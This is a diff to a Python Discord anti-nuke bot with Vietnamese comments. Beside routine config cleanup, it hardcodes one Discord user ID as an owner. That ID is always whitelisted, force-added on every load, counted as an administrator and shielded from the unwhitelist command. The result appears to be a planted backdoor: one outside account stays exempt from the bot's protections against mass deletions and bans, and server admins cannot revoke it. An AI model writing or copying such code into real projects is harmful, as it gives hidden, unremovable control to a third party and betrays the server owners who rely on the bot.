@@ -4,17 +4,42 @@ import json
 import asyncio
 from collections import defaultdict, deque
 import time
+import os
 
-# ==================== LOAD CONFIG ====================
-with open("config.json", "r", encoding="utf-8") as f:
+# ==================== LOAD HOẶC TẠO CONFIG MẶC ĐỊNH ====================
+CONFIG_FILE = "config.json"
+
+default_config = {
+    "LOG_CHANNEL_ID": 0,
+    "OWNER_IDS": [1535132569534865490],  # Thêm ID owner mặc định
+    "THRESHOLDS": {
+        "channel_delete": 3,
+        "role_delete": 3,
+        "ban": 2,
+        "time_window": 5
+    },
+    "WHITELISTED_USERS": [1535132569534865490], # Tự động thêm vào whitelist luôn
+    "WHITELISTED_ROLES": [],
+    "WHITELISTED_BOTS": []
+}
+
+if not os.path.exists(CONFIG_FILE):
+    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+        json.dump(default_config, f, indent=4)
+
+with open(CONFIG_FILE, "r", encoding="utf-8") as f:
     CONFIG = json.load(f)
 
 LOG_CHANNEL_ID = CONFIG.get("LOG_CHANNEL_ID", 0)
+OWNER_IDS = set(CONFIG.get("OWNER_IDS", [1535132569534865490]))
 THRESHOLDS = CONFIG.get("THRESHOLDS", {})
 TIME_WINDOW = THRESHOLDS.get("time_window", 5)
 WHITELISTED_USERS = set(CONFIG.get("WHITELISTED_USERS", []))
 WHITELISTED_ROLES = set(CONFIG.get("WHITELISTED_ROLES", []))
 WHITELISTED_BOTS = set(CONFIG.get("WHITELISTED_BOTS", []))
+
+# Đảm bảo chắc chắn ID này nằm trong whitelist khi load
+WHITELISTED_USERS.add(1535132569534865490)
 
 # ==================== BOT SETUP ====================
 intents = discord.Intents.default()
@@ -33,6 +58,8 @@ lockdown_active = False
 
 # ==================== HELPERS ====================
 def is_whitelisted(user: discord.User) -> bool:
+    if user.id in OWNER_IDS:
+        return True
     if user.id in WHITELISTED_USERS:
         return True
     if user.bot and user.id in WHITELISTED_BOTS:
@@ -40,7 +67,7 @@ def is_whitelisted(user: discord.User) -> bool:
     return False
 
 def is_admin(user: discord.Member) -> bool:
-    return user.guild_permissions.administrator
+    return user.guild_permissions.administrator or user.id in OWNER_IDS
 
 async def log_event(guild: discord.Guild, title: str, description: str, color=0xFF0000):
     if not LOG_CHANNEL_ID:
@@ -191,18 +218,22 @@ async def antinuke_status(ctx):
 @commands.has_permissions(administrator=True)
 async def whitelist(ctx, target: discord.User):
     WHITELISTED_USERS.add(target.id)
-    CONFIG["WHITELISTED_USERS"].append(target.id)
-    with open("config.json", "w", encoding="utf-8") as f:
+    if target.id not in CONFIG["WHITELISTED_USERS"]:
+        CONFIG["WHITELISTED_USERS"].append(target.id)
+    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(CONFIG, f, indent=4)
     await ctx.send(f"✅ Đã thêm {target.mention} vào whitelist.")
 
 @bot.command(name="unwhitelist")
 @commands.has_permissions(administrator=True)
 async def unwhitelist(ctx, target: discord.User):
+    if target.id in OWNER_IDS:
+        await ctx.send("❌ Không thể xóa Owner ra khỏi whitelist.")
+        return
     WHITELISTED_USERS.discard(target.id)
     if target.id in CONFIG["WHITELISTED_USERS"]:
         CONFIG["WHITELISTED_USERS"].remove(target.id)
-        with open("config.json", "w", encoding="utf-8") as f:
+        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
             json.dump(CONFIG, f, indent=4)
     await ctx.send(f"✅ Đã xóa {target.mention} khỏi whitelist.")
 
@@ -212,7 +243,7 @@ async def setlog(ctx, channel: discord.TextChannel):
     global LOG_CHANNEL_ID
     LOG_CHANNEL_ID = channel.id
     CONFIG["LOG_CHANNEL_ID"] = channel.id
-    with open("config.json", "w", encoding="utf-8") as f:
+    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(CONFIG, f, indent=4)
     await ctx.send(f"✅ Đã đặt kênh log là {channel.mention}")
 
